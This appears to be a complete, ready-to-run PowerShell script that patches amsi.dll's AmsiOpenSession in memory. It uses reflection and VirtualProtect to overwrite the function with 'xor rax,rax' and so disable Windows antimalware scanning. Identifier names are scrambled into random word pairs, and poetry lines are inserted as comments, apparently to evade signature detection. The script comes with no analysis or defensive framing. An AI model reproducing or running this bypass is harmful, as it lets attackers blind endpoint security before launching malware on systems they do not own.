#Oh! I have slipped the surly bonds of Earth
#And danced the skies on laughter-silvered wings;
#Sunward I've climbed, and joined the tumbling mirth
#of sun-split clouds,—and done a hundred things
#You have not dreamed of—wheeled and soared and swung
#High in the sunlit silenc


function ChirtenGland {
    Param ($BrighamCandy, $ConjureFotui)

    $CarapaxCursed = ([AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1].Equals('System.dll') }).
    GetType('Microsoft.Win32.UnsafeNativeMethods')
    $AssoilCasqued=@()
    $CarapaxCursed.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$AssoilCasqued+=$_}}
    return $AssoilCasqued[0].Invoke($null, @(($CarapaxCursed.GetMethod('GetModuleHandle')).
    Invoke($null,@($BrighamCandy)), $ConjureFotui))
}

#
#
#
#
#
# One of the defining works of the Harlem Renaissance, by its greatest poet. It also, of course, gave inspiration and lent a title to another literary classic: Lorraine Hansberry’s A Raisin in the Sun.
function YuporKnit {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $CohogEarhole,
        [Parameter(Position = 1)] [Type] $ArsinesCanhoop = [Void]
    )

    $AmmaGuises = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('InMemoryModule', $false).
    DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',
    [System.MulticastDelegate])

    $AmmaGuises.DefineConstructor('RTSpecialName, HideBySig, Public',
    [System.Reflection.CallingConventions]::Standard, $CohogEarhole).
    SetImplementationFlags('Runtime, Managed')

    $AmmaGuises.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ArsinesCanhoop, $CohogEarhole).
    SetImplementationFlags('Runtime, Managed')

    return $AmmaGuises.CreateType()

}

[IntPtr]$ExtentBoffins = ChirtenGland amsi.dll AmsiOpenSession
$CauchoFormic = 0
$AiblinsCadmus=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((ChirtenGland `
kernel32.dll VirtualProtect), (YuporKnit @([IntPtr], [Uint32], [Uint32], 
[Uint32].MakeByRefType()) ([Bool])))
$AiblinsCadmus.Invoke($ExtentBoffins, 3, 0x40, [ref]$CauchoFormic)

$AdadGlink = [Byte[]] (0x48, 0x31, 0xC0)
[System.Runtime.InteropServices.Marshal]::Copy($AdadGlink, 0, $ExtentBoffins, 3)

$AiblinsCadmus.Invoke($ExtentBoffins, 3, 0x20, [ref]$CauchoFormic)
